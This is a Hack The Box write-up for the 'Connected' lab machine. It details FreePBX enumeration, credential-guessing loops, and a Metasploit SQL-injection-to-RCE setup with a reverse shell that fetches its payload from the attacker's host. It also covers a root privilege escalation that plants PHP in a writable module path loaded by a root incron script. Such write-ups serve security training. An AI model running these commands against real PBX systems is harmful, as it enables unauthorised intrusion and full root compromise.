# Hack The Box: Connected Writeup

## Overview

Connected is an easy-difficulty Linux machine focused on FreePBX exploitation and privilege escalation through insecure system automation. The initial foothold comes from an unauthenticated SQL injection in FreePBX Endpoint Manager, which can be chained into command execution. Privilege escalation is achieved by abusing a root-run HA trigger script that loads attacker-controlled PHP code from a writable FreePBX module path.

> Flags are intentionally redacted in this writeup.

## Target

```text
Target IP: 10.129.105.220
Hostname: connected.htb
OS: Linux
Application: FreePBX 16.0.40.7
```

I added the hostname to `/etc/hosts`:

```bash
export IP=10.129.105.220
sudo sed -i '/connected.htb/d;/pbxconnect/d' /etc/hosts
echo "$IP connected.htb pbxconnect" | sudo tee -a /etc/hosts
```

## Enumeration

Initial service enumeration showed only SSH and web services:

```bash
sudo nmap -sCV -p 22,80,443 -oN scans/nmap-10.129.105.220.txt $IP
```

Relevant results:

```text
22/tcp  open  ssh       OpenSSH 7.4
80/tcp  open  http      Apache httpd 2.4.6, PHP 7.4.16
443/tcp open  ssl/http  Apache httpd 2.4.6, PHP 7.4.16
```

HTTP redirected to the FreePBX administration interface:

```bash
curl -I http://connected.htb/
curl -I http://connected.htb/admin/config.php
```

The web page identified the application:

```text
FreePBX Administration
FreePBX 16.0.40.7
```

The TLS certificate also exposed the common name:

```text
commonName=pbxconnect
```

So I mapped both names:

```text
10.129.105.220 connected.htb pbxconnect
```

## Web Enumeration

The main visible paths were:

```text
/admin/config.php
/ucp/
/admin/cxpanel/
/admin/api/
```

Directory fuzzing found mostly expected FreePBX paths:

```bash
ffuf -u http://connected.htb/admin/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
  -e .php,.txt,.bak,.old,.conf,.json \
  -fc 403,404 \
  -fs 204,206,207,208,209,210,211,212
```

Interesting hits:

```text
/admin/config.php
/admin/api
/admin/assets
/admin/modules
/admin/views
```

I also tested virtual hosts:

```bash
ffuf -u http://10.129.105.220/ \
  -H "Host: FUZZ.connected.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 229
```

No useful vhost was found.

## Failed and Non-Useful Paths

### Hidden `key` Value

The FreePBX login page contained a hidden-looking value:

```html
<div id="key" style="color: white;font-size:small">
    ...
</div>
```

At first I tested it as a password for:

```text
admin:<key>
100:<key>
101:<key>
1000:<key>
```

All failed. Looking at browser storage showed this value was simply the `PHPSESSID`, not a credential.

### UCP Login and Forgot Password

The UCP login page was available:

```text
http://connected.htb/ucp/
```

The JavaScript showed login used:

```text
module=User&command=login
```

Forgot password used:

```text
/ucp/index.php
quietmode=1&module=User&command=forgot
```

I tested forgot-password behavior:

```bash
curl -sL -c ucp-cookies.txt http://connected.htb/ucp/ -o ucp.html
TOKEN=$(grep -oP 'name="token" value="\K[^"]+' ucp.html)

curl -sL -b ucp-cookies.txt -c ucp-cookies.txt \
  -H 'X-Requested-With: XMLHttpRequest' \
  -e 'http://connected.htb/ucp/' \
  -X POST 'http://connected.htb/ucp/index.php' \
  --data-urlencode "token=$TOKEN" \
  --data-urlencode "username=999999" \
  --data-urlencode "email=" \
  --data-urlencode "quietmode=1" \
  --data-urlencode "module=User" \
  --data-urlencode "command=forgot"
```

It returned:

```json
{"status":true,"message":"Submitted"}
```

The same response appeared for invalid users, so there was no username leak.

I also tested common UCP credentials:

```bash
for u in 100 101 102 200 201 1000; do
  for p in "$u" password 1234 123456 voicemail changeme; do
    curl -sL -c ucp-cookies.txt http://connected.htb/ucp/ -o ucp.html
    TOKEN=$(grep -oP 'name="token" value="\K[^"]+' ucp.html)
    r=$(curl -sL -b ucp-cookies.txt -c ucp-cookies.txt \
      -H 'X-Requested-With: XMLHttpRequest' \
      -e 'http://connected.htb/ucp/' \
      -X POST 'http://connected.htb/ucp/' \
      --data-urlencode "token=$TOKEN" \
      --data-urlencode "username=$u" \
      --data-urlencode "password=$p" \
      --data-urlencode "module=User" \
      --data-urlencode "command=login")
    echo "$u:$p -> $r"
  done
done
```

All returned invalid credentials.

### SIP Enumeration

Because this is a PBX, I checked SIP:

```bash
sudo nmap -sU -sV -p 5060,5160 --script sip-methods,sip-enum-users -oN scans/sip.txt $IP
svwar -m OPTIONS -e100-999 $IP
```

The ports appeared `open|filtered`, but enumeration timed out and did not produce valid extensions.

### FreePBX API

The API route existed:

```text
/admin/api/api/gql
/admin/api/api/token
```

GraphQL required a JWT:

```json
{"error":"access_denied","hint":"Missing \"Authorization\" header"}
```

The token endpoint required OAuth client credentials:

```json
{"error":"invalid_client","message":"Client authentication failed"}
```

I tested obvious OAuth client IDs and secrets, but none worked:

```bash
for c in admin:admin admin:password admin:changeme freepbx:freepbx; do
  curl -s -i -u "$c" \
    -X POST 'http://connected.htb/admin/api/api/token' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data 'grant_type=client_credentials'
done
```

This path did not provide access.

## Initial Foothold

Version research led to CVE-2025-57819, an unauthenticated SQL injection in the FreePBX Endpoint Manager component. The Metasploit module was:

```text
exploit/unix/http/freepbx_unauth_sqli_to_rce
```

Initial attempts failed:

```text
payload-failed: Cronjob was not created
Cronjob not removed, please perform manual cleanup!
```

The important fix was `TARGETURI`. I originally used:

```text
set TARGETURI /admin
```

That caused the module check to report:

```text
No SQL injection detected, target is patched
```

Changing it to `/` fixed exploitation:

```text
set TARGETURI /
```

Working Metasploit settings:

```text
use exploit/unix/http/freepbx_unauth_sqli_to_rce
set RHOSTS 10.129.105.220
set VHOST connected.htb
set TARGETURI /
set LHOST 10.10.14.55
set FETCH_SRVHOST 10.10.14.55
set FETCH_WRITABLE_DIR /tmp
set FETCH_COMMAND WGET
set payload cmd/linux/http/x64/shell/reverse_tcp
run
```

I also lowered the VPN MTU, which helped with staged payload delivery:

```bash
sudo ip link set dev tun0 mtu 1200
```

Successful output:

```text
The target is vulnerable. Detected SQL injection
Created cronjob
Command shell session opened
```

The shell landed as:

```bash
whoami
id
```

```text
asterisk
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```

The user flag was located at:

```bash
cat /home/asterisk/user.txt
```

```text
HTB{redacted}
```

I stabilized the shell with Python:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

## Privilege Escalation Enumeration

I searched for incron and automation-related files:

```bash
find / -name '*incron*' 2>/dev/null
```

Important results:

```text
/etc/incron.d
/etc/incron.d/local
/etc/incron.d/sysadmin
/var/spool/incron/root
/usr/local/asterisk/ha_trigger
/usr/local/asterisk/incron
/var/spool/asterisk/sysadmin/incron_restart
/usr/sbin/incrond
```

The writable trigger files were:

```bash
ls -la /usr/local/asterisk/ha_trigger
ls -la /var/spool/asterisk/sysadmin/incron_restart
```

```text
/usr/local/asterisk/ha_trigger
/var/spool/asterisk/sysadmin/incron_restart
```

The root incron configuration was readable through `/etc/incron.d`:

```bash
for f in /etc/incron.d/*; do
  echo "== $f =="
  cat "$f" 2>/dev/null
done
```

Relevant entries:

```text
== /etc/incron.d/local ==
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#

== /etc/incron.d/sysadmin ==
/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#

== /etc/incron.d/legacy ==
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
```

The HA trigger was the useful path.

## Failed Privilege Escalation Attempts

### Wrong `freepbx_ha` Path

I first created:

```text
/var/www/html/admin/modules/freepbx_ha/incron.php
```

With:

```php
<?php
function rootTrigger() {
    copy('/bin/bash', '/tmp/rootbash');
    chmod('/tmp/rootbash', 04755);
}
?>
```

Then triggered:

```bash
echo 1 > /usr/local/asterisk/ha_trigger
sleep 5
ls -la /tmp/rootbash
```

This failed because `sysadmin_ha` did not load that path.

### Wrong Framework Hook Format

The file `/var/www/html/admin/modules/framework/hooks/README.md` explained that files placed in `/usr/local/asterisk/incron` are moved into the framework hooks directory and run if signed/valid.

I tried a plain hook:

```bash
cat > /usr/local/asterisk/incron/SYSTEM.rootbash <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
```

This also failed because the framework hook system expects signed/base64 hook packages, not arbitrary shell scripts.

## Finding the Correct Execution Path

The breakthrough came from inspecting `/usr/sbin/sysadmin_ha`:

```bash
file /usr/sbin/sysadmin_ha /usr/bin/sysadmin_manager
head -n 80 /usr/sbin/sysadmin_ha
strings /usr/sbin/sysadmin_ha | grep -Ei 'php|freepbx|ha|trigger|module|incron|rootTrigger'
```

The script showed the exact load path:

```php
#!/usr/bin/php -q
<?php

if (file_exists("/var/www/html/admin/modules/freepbx_ha/license.php")) {
    include_once("/var/www/html/admin/modules/freepbx_ha/license.php");
}

$i = "/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php";
if (file_exists($i)) {
    require_once($i);
    $incron = new incron;
    $incron->rootTrigger();
}
```

So the correct path was:

```text
/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php
```

The file also needed to define an `incron` class with a `rootTrigger()` method.

## Root Exploit

I created the expected module path and PHP class:

```bash
mkdir -p /var/www/html/admin/modules/freepbx_ha/functions.inc

cat > /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php <<'EOF'
<?php
class incron {
    public function __construct() {}
    public function rootTrigger() {
        copy('/bin/bash', '/tmp/rootbash');
        chmod('/tmp/rootbash', 04755);
    }
}
?>
EOF
```

Then triggered the HA root workflow:

```bash
echo 1 > /usr/local/asterisk/ha_trigger
sleep 5
ls -la /tmp/rootbash
```

The SUID bash binary appeared:

```text
-rwsr-xr-x 1 root root ... /tmp/rootbash
```

Then I executed it with `-p` to preserve effective UID:

```bash
/tmp/rootbash -p
id
```

Result:

```text
uid=999(asterisk) gid=1000(asterisk) euid=0(root) groups=1000(asterisk)
```

Finally:

```bash
cat /root/root.txt
```

```text
HTB{redacted}
```

## Lessons Learned

- FreePBX version disclosure was the key to identifying the intended initial vulnerability.
- The Metasploit module required `TARGETURI /`, not `/admin`.
- The hidden login-page `key` was only a session ID, not a credential.
- UCP forgot-password returned the same response for valid and invalid users, so it was not useful for user enumeration.
- The privilege escalation required reading the actual root-executed script instead of assuming the module path.
- The correct PE target was not `freepbx_ha/incron.php`; it was `freepbx_ha/functions.inc/incron.php`.

## Cleanup Notes

On a real assessment, cleanup would include removing:

```bash
/tmp/rootbash
/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php
/var/www/html/admin/modules/freepbx_ha/incron.php
/usr/local/asterisk/incron/SYSTEM.*
```

For Hack The Box, resetting the machine is sufficient.
